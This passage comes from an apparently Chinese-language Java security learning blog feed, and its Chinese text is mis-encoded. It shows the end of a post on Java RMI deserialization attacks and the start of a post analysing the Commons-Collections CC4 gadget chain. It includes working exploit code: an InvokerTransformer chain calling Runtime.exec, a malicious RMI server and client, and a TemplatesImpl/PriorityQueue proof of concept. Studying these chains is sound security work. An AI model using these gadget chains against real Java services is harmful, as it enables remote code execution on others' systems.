class="hljs-string">&quot;getMethod&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;String.class, Class[].class&#125;, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-string">&quot;getRuntime&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[<span class="hljs-number">0</span>]&#125;),<br>            <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;invoke&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;Object.class, Object[].class&#125;, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-literal">null</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[<span class="hljs-number">0</span>]&#125;),<br>            <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;exec&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;String.class&#125;, <span class="hljs-keyword">new</span> <span class="hljs-title class_">String</span>[]&#123;<span class="hljs-string">&quot;calc.exe&quot;</span>&#125;),<br>        &#125;;<br>        <span class="hljs-type">Transformer</span> <span class="hljs-variable">transformerChain</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ChainedTransformer</span>(transformers);<br>        <span class="hljs-type">Map</span> <span class="hljs-variable">innerMap</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>();<br>        <span class="hljs-type">Map</span> <span class="hljs-variable">outerMap</span> <span class="hljs-operator">=</span> LazyMap.decorate(innerMap, transformerChain);<br><br>        <span class="hljs-type">Class</span> <span class="hljs-variable">clazz</span> <span class="hljs-operator">=</span> Class.forName(<span class="hljs-string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>);<br>        <span class="hljs-type">Constructor</span> <span class="hljs-variable">construct</span> <span class="hljs-operator">=</span> clazz.getDeclaredConstructor(Class.class, Map.class);<br>        construct.setAccessible(<span class="hljs-literal">true</span>);<br>        <span class="hljs-type">InvocationHandler</span> <span class="hljs-variable">handler</span> <span class="hljs-operator">=</span> (InvocationHandler) construct.newInstance(Retention.class, outerMap);<br>        <span class="hljs-type">Map</span> <span class="hljs-variable">proxyMap</span> <span class="hljs-operator">=</span> (Map) Proxy.newProxyInstance(Map.class.getClassLoader(), <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;Map.class&#125;, handler);<br>        handler = (InvocationHandler) construct.newInstance(Retention.class, proxyMap);<br><br>        <span class="hljs-keyword">return</span> handler;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>æ¶æ„æœåŠ¡ç«¯å°†æ¶æ„å¯¹è±¡æ³¨å†Œåˆ°æ³¨å†Œä¸­å¿ƒ</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com;<br><br><span class="hljs-keyword">import</span> java.rmi.AlreadyBoundException;<br><span class="hljs-keyword">import</span> java.rmi.RemoteException;<br><span class="hljs-keyword">import</span> java.rmi.registry.LocateRegistry;<br><span class="hljs-keyword">import</span> java.rmi.registry.Registry;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">EvilClassServer</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> RemoteException, AlreadyBoundException &#123;<br>        <span class="hljs-type">User</span> <span class="hljs-variable">liming</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ServerReturnObject</span>(<span class="hljs-string">&quot;liming&quot;</span>,<span class="hljs-number">15</span>);<br>        <span class="hljs-type">Registry</span> <span class="hljs-variable">registry</span> <span class="hljs-operator">=</span> LocateRegistry.createRegistry(<span class="hljs-number">1099</span>);<br>        registry.bind(<span class="hljs-string">&quot;user&quot;</span>,liming);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>å®¢æˆ·ç«¯è·å–æ¶æ„å¯¹è±¡ï¼Œè°ƒç”¨ getUser() æ–¹æ³•ï¼Œååºåˆ—åŒ–æ¶æ„è¿œç¨‹å¯¹è±¡</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com;<br><br><span class="hljs-keyword">import</span> java.rmi.registry.LocateRegistry;<br><span class="hljs-keyword">import</span> java.rmi.registry.Registry;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">EvilClient</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-type">Registry</span> <span class="hljs-variable">registry</span> <span class="hljs-operator">=</span> LocateRegistry.getRegistry(<span class="hljs-string">&quot;127.0.0.1&quot;</span>,<span class="hljs-number">1099</span>);<br>        <span class="hljs-type">User</span> <span class="hljs-variable">user</span> <span class="hljs-operator">=</span> (User)registry.lookup(<span class="hljs-string">&quot;user&quot;</span>);<br>        user.getUser();<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509242104061.png"></p><h5 id="è¿œç¨‹åŠ è½½å¯¹è±¡"><a href="#è¿œç¨‹åŠ è½½å¯¹è±¡" class="headerlink" title="è¿œç¨‹åŠ è½½å¯¹è±¡"></a><font style="color:rgb(80, 80, 92);">è¿œç¨‹åŠ è½½å¯¹è±¡</font></h5><blockquote><p>ã€ŠJava å®‰å…¨æ¼«è°ˆã€‹</p><p>codebaseæ˜¯ä¸€ä¸ªåœ°å€ï¼Œå‘Šè¯‰Javaè™šæ‹Ÿæœºæˆ‘ä»¬åº”è¯¥ä»å“ªä¸ªåœ°æ–¹å»æœç´¢ç±»ï¼Œæœ‰ç‚¹åƒæˆ‘ä»¬æ—¥å¸¸ç”¨çš„</p><p>CLASSPATHï¼Œä½†CLASSPATHæ˜¯æœ¬åœ°è·¯å¾„ï¼Œè€Œcodebaseé€šå¸¸æ˜¯è¿œç¨‹URLï¼Œæ¯”å¦‚httpã€ftpç­‰ã€‚</p><p>å¦‚æœæˆ‘ä»¬æŒ‡å®š codebase&#x3D;<a href="http://example.com/">http://example.com/</a> ï¼Œç„¶ååŠ è½½ org.vulhub.example.Example ç±»ï¼Œåˆ™</p><p>Javaè™šæ‹Ÿæœºä¼šä¸‹è½½è¿™ä¸ªæ–‡ä»¶ <a href="http://example.com/org/vulhub/example/Example.class">http://example.com/org/vulhub/example/Example.class</a> ï¼Œå¹¶ä½œä¸º</p><p>Exampleç±»çš„å­—èŠ‚ç ã€‚</p><p>RMIçš„æµç¨‹ä¸­ï¼Œå®¢æˆ·ç«¯å’ŒæœåŠ¡ç«¯ä¹‹é—´ä¼ é€’çš„æ˜¯ä¸€äº›åºåˆ—åŒ–åçš„å¯¹è±¡ï¼Œè¿™äº›å¯¹è±¡åœ¨ååºåˆ—åŒ–æ—¶ï¼Œå°±ä¼šå»å¯»</p><p>æ‰¾ç±»ã€‚å¦‚æœæŸä¸€ç«¯ååºåˆ—åŒ–æ—¶å‘ç°ä¸€ä¸ªå¯¹è±¡ï¼Œé‚£ä¹ˆå°±ä¼šå»è‡ªå·±çš„CLASSPATHä¸‹å¯»æ‰¾æƒ³å¯¹åº”çš„ç±»ï¼›å¦‚æœåœ¨</p><p>æœ¬åœ°æ²¡æœ‰æ‰¾åˆ°è¿™ä¸ªç±»ï¼Œå°±ä¼šå»è¿œç¨‹åŠ è½½codebaseä¸­çš„ç±»ã€‚</p><p>è¿™ä¸ªæ—¶å€™é—®é¢˜å°±æ¥äº†ï¼Œå¦‚æœcodebaseè¢«æ§åˆ¶ï¼Œæˆ‘ä»¬ä¸å°±å¯ä»¥åŠ è½½æ¶æ„ç±»äº†å—ï¼Ÿ</p><p>å¯¹ï¼Œåœ¨RMIä¸­ï¼Œæˆ‘ä»¬æ˜¯å¯ä»¥å°†codebaseéšç€åºåˆ—åŒ–æ•°æ®ä¸€èµ·ä¼ è¾“çš„ï¼ŒæœåŠ¡å™¨åœ¨æ¥æ”¶åˆ°è¿™ä¸ªæ•°æ®åå°±ä¼šå»</p><p>CLASSPATHå’ŒæŒ‡å®šçš„codebaseå¯»æ‰¾ç±»ï¼Œç”±äºcodebaseè¢«æ§åˆ¶å¯¼è‡´ä»»æ„å‘½ä»¤æ‰§è¡Œæ¼æ´ã€‚</p><p>ä¸è¿‡æ˜¾ç„¶å®˜æ–¹ä¹Ÿæ³¨æ„åˆ°äº†è¿™ä¸€ä¸ªå®‰å…¨éšæ‚£ï¼Œæ‰€ä»¥åªæœ‰æ»¡è¶³å¦‚ä¸‹æ¡ä»¶çš„RMIæœåŠ¡å™¨æ‰èƒ½è¢«æ”»å‡»ï¼š</p><ul><li>å®‰è£…å¹¶é…ç½®äº†SecurityManager</li><li>Javaç‰ˆæœ¬ä½äº7u21ã€6u45ï¼Œæˆ–è€…è®¾ç½®äº† java.rmi.server.useCodebaseOnly&#x3D;false</li></ul><p>å…¶ä¸­ java.rmi.server.useCodebaseOnly æ˜¯åœ¨Java 7u21ã€6u45çš„æ—¶å€™ä¿®æ”¹çš„ä¸€ä¸ªé»˜è®¤è®¾ç½®ï¼š</p><p><a href="https://docs.oracle.com/javase/7/docs/technotes/guides/rmi/enhancements-7.html">https://docs.oracle.com/javase/7/docs/technotes/guides/rmi/enhancements-7.html</a></p><p><a href="https://www.oracle.com/technetwork/java/javase/7u21-relnotes-1932873.html">https://www.oracle.com/technetwork/java/javase/7u21-relnotes-1932873.html</a></p><p>å®˜æ–¹å°† java.rmi.server.useCodebaseOnly çš„é»˜è®¤å€¼ç”± false æ”¹ä¸ºäº† true ã€‚åœ¨ java.rmi.server.useCodebaseOnly é…ç½®ä¸º true çš„æƒ…å†µä¸‹ï¼ŒJavaè™šæ‹Ÿæœºå°†åªä¿¡ä»»é¢„å…ˆé…ç½®å¥½çš„ codebase ï¼Œä¸å†æ”¯æŒä»RMIè¯·æ±‚ä¸­è·å–ã€‚</p></blockquote><h3 id="4-3-æ”»å‡»æœåŠ¡ç«¯"><a href="#4-3-æ”»å‡»æœåŠ¡ç«¯" class="headerlink" title="4.3 æ”»å‡»æœåŠ¡ç«¯"></a>4.3 æ”»å‡»æœåŠ¡ç«¯</h3><p>è¿™ä¸€éƒ¨åˆ†åŒæ ·æ˜¯ç†Ÿæ‚‰çš„ unmarshalValue ,</p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509242105634.png"></p><p><strong>æœåŠ¡ç«¯è°ƒç”¨æ–¹æ³•æ—¶ï¼Œå­˜åœ¨éåŸºç¡€ç±»å‹çš„å‚æ•°æ—¶ï¼Œå°±ä¼šè¢«æ¶æ„ Client ç«¯ä¼ å…¥æ¶æ„æ•°æ®è§¦å‘ååºåˆ—åŒ–</strong></p><h2 id="å‚è€ƒæ–‡ç« ï¼š"><a href="#å‚è€ƒæ–‡ç« ï¼š" class="headerlink" title="å‚è€ƒæ–‡ç« ï¼š"></a>å‚è€ƒæ–‡ç« ï¼š</h2><p>å®˜æ–¹æ–‡æ¡£</p><p><a href="https://docs.oracle.com/javase/tutorial/rmi/overview.html">https://docs.oracle.com/javase/tutorial/rmi/overview.html</a></p><p><font style="color:rgb(34, 34, 38);">ä»æ‡µé€¼åˆ°æç„¶å¤§æ‚Ÿä¹‹Javaä¸­RMIçš„ä½¿ç”¨</font></p><p><a href="https://blog.csdn.net/lmy86263/article/details/72594760">https://blog.csdn.net/lmy86263/article/details/72594760</a></p><p><font style="color:rgb(51, 51, 51);">JAVAå®‰å…¨åŸºç¡€ï¼ˆå››ï¼‰â€“ RMIæœºåˆ¶</font></p><p><a href="https://xz.aliyun.com/news/8760">https://xz.aliyun.com/news/8760</a></p><p><font style="color:rgb(68, 68, 68);">ä¸€æ–‡å›é¡¾æ”»å‡»Java RMIæ–¹å¼</font></p><p><a href="https://www.anquanke.com/post/id/263726#h2-5">https://www.anquanke.com/post/id/263726#h2-5</a></p><p>Java RMI æ”»å‡»ç”±æµ…å…¥æ·±</p><p><a href="https://su18.org/post/rmi-attack/">https://su18.org/post/rmi-attack/</a></p><p><a href="https://drun1baby.top/2022/07/23/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8BRMI%E4%B8%93%E9%A2%9802-RMI%E7%9A%84%E5%87%A0%E7%A7%8D%E6%94%BB%E5%87%BB%E6%96%B9%E5%BC%8F/">https://drun1baby.top/2022/07/23/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8BRMI%E4%B8%93%E9%A2%9802-RMI%E7%9A%84%E5%87%A0%E7%A7%8D%E6%94%BB%E5%87%BB%E6%96%B9%E5%BC%8F/</a></p><p><a href="https://www.cnblogs.com/pihaochen/p/11020596.html"><font style="color:rgb(89, 182, 215);">https://www.cnblogs.com/pihaochen/p/11020596.html</font></a></p><p><a href="https://xz.aliyun.com/t/9053"><font style="color:rgb(89, 182, 215);">https://xz.aliyun.com/t/9053</font></a></p><p><a href="https://xz.aliyun.com/t/7930"><font style="color:rgb(89, 182, 215);">https://xz.aliyun.com/t/7930</font></a></p><p><a href="https://xz.aliyun.com/t/6660"><font style="color:rgb(89, 182, 215);">https://xz.aliyun.com/t/6660</font></a></p><p><a href="https://xz.aliyun.com/t/7079"><font style="color:rgb(89, 182, 215);">https://xz.aliyun.com/t/7079</font></a></p>]]></content>
    
    
    <categories>
      
      <category>Java</category>
      
    </categories>
    
    
    <tags>
      
      <tag>java å­¦ä¹ </tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>CC4_CC2_CC5_CC7</title>
    <link href="/2025/09/02/CC4_CC2_CC5_CC7/"/>
    <url>/2025/09/02/CC4_CC2_CC5_CC7/</url>
    
    <content type="html"><![CDATA[<h1 id="CC4"><a href="#CC4" class="headerlink" title="CC4"></a>CC4</h1><h2 id="ç¯å¢ƒï¼š"><a href="#ç¯å¢ƒï¼š" class="headerlink" title="ç¯å¢ƒï¼š"></a>ç¯å¢ƒï¼š</h2><ul><li><font style="color:rgb(80, 80, 92);">Commons-Collections 4.0</font></li></ul><p><a href="https://mvnrepository.com/artifact/org.apache.commons/commons-collections4/4.0">https://mvnrepository.com/artifact/org.apache.commons/commons-collections4/4.0</a></p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">dependencies</span>&gt;</span><br>  <span class="hljs-comment">&lt;!-- https://mvnrepository.com/artifact/org.apache.commons/commons-collections4 --&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>org.apache.commons<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>commons-collections4<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>4.0<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span><br>  <span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">dependencies</span>&gt;</span><br></code></pre></td></tr></table></figure><ul><li>JDK 8u65</li></ul><h2 id="åˆ†æï¼š"><a href="#åˆ†æï¼š" class="headerlink" title="åˆ†æï¼š"></a>åˆ†æï¼š</h2><p>ä»¥ <font style="color:#080808;background-color:#ffffff;">ChainedTransformer.transform ä¸ºå‡ºå‘ç‚¹ï¼Œå¾€å›æ‰¾</font></p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509021852635.png"></p><p><font style="color:#080808;background-color:#ffffff;">æ‰¾åˆ° TransformingComparator.compare ä¸­è°ƒç”¨äº† transform æ–¹æ³•</font></p><p><font style="color:#080808;background-color:#ffffff;">å†æ‰¾åˆ° PriorityQueue ç±»ä¸­ï¼š</font></p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509021852526.png"></p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509021852926.png"></p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509021853566.png"></p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509021853113.png"></p><p><font style="color:#080808;background-color:#ffffff;"></font></p><p>æœ€åæ‰¾åˆ°çš„é“¾ä¹Ÿå°±æ˜¯ï¼š</p><p><font style="color:#080808;background-color:#ffffff;">PriorityQueue.</font></p><p><font style="color:#080808;background-color:#ffffff;">readObject</font></p><p><font style="color:#080808;background-color:#ffffff;">heapify</font></p><p><font style="color:#080808;background-color:#ffffff;">siftDown</font></p><p><font style="color:#080808;background-color:#ffffff;">siftDownUsingComparator</font></p><p><font style="color:#080808;background-color:#ffffff;">compare</font></p><p><font style="color:#080808;background-color:#ffffff;">TransformingComparator.compare.transform</font><strong><font style="color:#080808;background-color:#ffffff;"></font></strong></p><p><font style="color:#080808;background-color:#ffffff;">ChainedTransformer.transform</font></p><p><font style="color:#080808;background-color:#ffffff;">PriorityQueue.readObject.heapify.siftDown.siftDownUsingComparator.compare</font></p><p>-&gt;</p><p><font style="color:#080808;background-color:#ffffff;">TransformingComparator.compare.transform</font></p><p>-&gt;</p><p><font style="color:#080808;background-color:#ffffff;">ChainedTransformer.transform</font></p><p><font style="color:#080808;background-color:#ffffff;"></font></p><h2 id="ç¼–å†™-POCï¼š"><a href="#ç¼–å†™-POCï¼š" class="headerlink" title="ç¼–å†™ POCï¼š"></a><font style="color:#080808;background-color:#ffffff;">ç¼–å†™ POCï¼š</font></h2><p>å…ˆå°† CC3 çš„ä»£ç æ‰§è¡Œéƒ¨åˆ†æ‹¿æ¥ï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">//ä»£ç æ‰§è¡Œ InstantiateTransformer</span><br><span class="hljs-type">TemplatesImpl</span> <span class="hljs-variable">templates</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">TemplatesImpl</span>();<br><span class="hljs-type">Class</span> <span class="hljs-variable">tc</span> <span class="hljs-operator">=</span> templates.getClass();<br><span class="hljs-type">Field</span> <span class="hljs-variable">nameFiled</span> <span class="hljs-operator">=</span> tc.getDeclaredField(<span class="hljs-string">&quot;_name&quot;</span>);<br>nameFiled.setAccessible(<span class="hljs-literal">true</span>);<br>nameFiled.set(templates, <span class="hljs-string">&quot;aaa&quot;</span>);<br><span class="hljs-type">Field</span> <span class="hljs-variable">bytecodesFiled</span> <span class="hljs-operator">=</span> tc.getDeclaredField(<span class="hljs-string">&quot;_bytecodes&quot;</span>);<br>bytecodesFiled.setAccessible(<span class="hljs-literal">true</span>);<br><span class="hljs-type">byte</span>[] code = Files.readAllBytes(Paths.get(<span class="hljs-string">&quot;E://Test.class&quot;</span>));<br><span class="hljs-type">byte</span>[][] codes = &#123;code&#125;;<br>bytecodesFiled.set(templates, codes);<br><br><span class="hljs-type">InstantiateTransformer</span> <span class="hljs-variable">instantiateTransformer</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">InstantiateTransformer</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;Templates.class&#125;, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;templates&#125;);<br>Transformer[] transformers = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Transformer</span>[]&#123;<br>    <span class="hljs-keyword">new</span> <span class="hljs-title class_">ConstantTransformer</span>(TrAXFilter.class),<br>    instantiateTransformer<br>&#125;;<br><br><span class="hljs-type">ChainedTransformer</span> <span class="hljs-variable">chainedTransformer</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ChainedTransformer</span>&lt;&gt;(transformers);<br></code></pre></td></tr></table></figure><p><font style="color:#080808;background-color:#ffffff;">å¯¹ç…§æºç è¿›è¡Œæ„é€ ï¼š</font></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-type">TransformingComparator</span> <span class="hljs-variable">transformingComparator</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">TransformingComparator</span>&lt;&gt;(chainedTransformer);<br><span class="hljs-type">PriorityQueue</span> <span class="hljs-variable">priorityQueue</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">PriorityQueue</span>&lt;&gt;(transformingComparator);<br></code></pre></td></tr></table></figure><p><font style="color:#080808;background-color:#ffffff;">å†™å¥½ä¹‹åï¼Œå‘ç°æ²¡æœ‰ååº”</font></p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509021853126.png"></p><p>è°ƒè¯•æ¥åˆ°æ­¤å¤„ï¼š</p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509021853395.png"></p><p>çœ‹åˆ° size:0 ï¼Œä¸ä¼šè¿›å…¥ siftDown.</p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509021853636.png"><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509021853140.png"><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509021853829.png"></p><blockquote><p><code>for (int i = (size &gt;&gt;&gt; 1) - 1; i &gt;= 0; i--)</code></p><h3 id="1-size-1"><a href="#1-size-1" class="headerlink" title="1. size &gt;&gt;&gt; 1"></a>1. <code>size &gt;&gt;&gt; 1</code></h3><ul><li><code>&gt;&gt;&gt;</code> æ˜¯ <strong>æ— ç¬¦å·å³ç§»è¿ç®—ç¬¦</strong>ã€‚</li><li><code>size &gt;&gt;&gt; 1</code> ç­‰ä»·äº <code>size / 2</code>ï¼ˆå‘ä¸‹å–æ•´ï¼‰ï¼Œä½†ä¸åŒäº <code>/2</code> çš„åœ°æ–¹åœ¨äºï¼š<ul><li><code>/2</code> æ˜¯æ™®é€šçš„é™¤æ³•è¿ç®—ï¼›</li><li><code>&gt;&gt;&gt; 1</code> æ˜¯ä½è¿ç®—ï¼Œæ‰§è¡Œæ•ˆç‡æ›´é«˜ï¼ˆå°¤å…¶æ˜¯åœ¨åº•å±‚ç®—æ³•é‡Œï¼‰ã€‚</li></ul></li></ul><p>æ‰€ä»¥ <code>size &gt;&gt;&gt; 1</code> å°±æ˜¯ <strong>æ•°ç»„é•¿åº¦çš„ä¸€åŠ</strong>ã€‚</p><h3 id="2-size-1-1"><a href="#2-size-1-1" class="headerlink" title="2. (size &gt;&gt;&gt; 1) - 1"></a>2. <code>(size &gt;&gt;&gt; 1) - 1</code></h3><ul><li>å…ˆå–æ•°ç»„é•¿åº¦çš„ä¸€åŠï¼Œå†å‡å» 1ã€‚</li><li>ç»“æœæ˜¯ <strong>ä»æ•°ç»„çš„æœ€åä¸€ä¸ªéå¶å­èŠ‚ç‚¹å¼€å§‹çš„ä½ç½®</strong>ã€‚</li></ul><p>ä¾‹å¦‚åœ¨å †æ’åºæˆ–ä¼˜å…ˆé˜Ÿåˆ—çš„å®ç°ä¸­ï¼š</p><ul><li>å¶å­èŠ‚ç‚¹çš„ä¸‹æ ‡èŒƒå›´æ˜¯ <code>size/2 ~ size-1</code>ã€‚</li><li>éå¶å­èŠ‚ç‚¹çš„æœ€åä¸€ä¸ªä½ç½®å°±æ˜¯ <code>(size/2)-1</code>ã€‚</li></ul><h3 id="3-for-int-i-i-0-i"><a href="#3-for-int-i-i-0-i" class="headerlink" title="3. for (int i = ...; i &gt;= 0; i--)"></a>3. <code>for (int i = ...; i &gt;= 0; i--)</code></h3><ul><li><code>i</code> ä» <code>(size &gt;&gt;&gt; 1) - 1</code> å¼€å§‹ï¼Œé€’å‡åˆ° <code>0</code>ã€‚</li><li>ä¹Ÿå°±æ˜¯è¯´ï¼š<strong>å¾ªç¯ä¼šä»æœ€åä¸€ä¸ªéå¶å­èŠ‚ç‚¹å¼€å§‹ï¼Œå¾€å‰éå†æ‰€æœ‰éå¶å­èŠ‚ç‚¹ï¼Œç›´åˆ°æ ¹èŠ‚ç‚¹</strong>ã€‚</li></ul><p>è¿™æ˜¯ä¸€ä¸ªå»ºå †ï¼ˆheapifyï¼‰çš„å®ç°ã€‚ä½œç”¨æ˜¯ï¼š<strong>ä»æœ€åä¸€ä¸ªéå¶å­èŠ‚ç‚¹å¼€å§‹ï¼Œä¾æ¬¡å‘å‰è°ƒæ•´ï¼Œç›´åˆ°æŠŠæ•´ä¸ªæ•°ç»„è°ƒæ•´æˆä¸€ä¸ªå †ç»“æ„</strong>ã€‚  </p></blockquote><p>æ‰€ä»¥è¦ä¿è¯ size ä¸º 2 æ‰èƒ½è¿›å…¥ for å¾ªç¯æ‰§è¡Œä»£ç </p><p>äºæ˜¯æ·»åŠ ï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs java">priorityQueue.add(<span class="hljs-number">1</span>);<br>priorityQueue.add(<span class="hljs-number">2</span>);<br></code></pre></td></tr></table></figure><p>æ­¤æ—¶æ‰§è¡Œä»£ç åæŠ¥é”™äº†</p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509021853681.png"></p><p>è·Ÿè¿› add å‡½æ•°ï¼š</p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509021854556.png"></p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509021854839.png"></p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509021854687.png"></p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509021854246.png"></p><p>å‘ç° add å‡½æ•°ä¹Ÿä¼šè°ƒç”¨ <font style="color:#080808;background-color:#ffffff;">compareï¼Œè€Œå½“ add è°ƒç”¨ compare ä¹Ÿå°±ä¼šè°ƒç”¨ </font>transform</p><p>è€Œæˆ‘ä»¬çŸ¥é“ _tfactory åœ¨ååºåˆ—åŒ–çš„æ—¶å€™æ‰ä¼šè¢«èµ‹å€¼ã€CC3 ä¸­åˆ†æ åˆ©ç”¨ TemplatesImpl åŠ è½½å­—èŠ‚ç  æ—¶æåŠã€‘</p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509021854728.png"></p><p>æ‰€ä»¥ï¼Œå…ˆç»™  <font style="color:#080808;background-color:#ffffff;">transformers&#x2F;chainedTransformer ä¼ ä¸€ä¸ªæ²¡ç”¨çš„ä¸œè¥¿ï¼Œè®© add æ‰§è¡Œæ—¶ä¸ä¼šè°ƒç”¨</font></p><p><font style="color:#080808;background-color:#ffffff;">compare.transform ,åœ¨ååºåˆ—åŒ–æ—¶å†èµ‹ç»™æ­£å¸¸å€¼ã€‚</font></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-type">ChainedTransformer</span> <span class="hljs-variable">chainedTransformer</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ChainedTransformer</span>&lt;&gt;(transformers);<br><br>        <span class="hljs-type">TransformingComparator</span> <span class="hljs-variable">transformingComparator</span> <span class="hljs-operator">=</span> <span 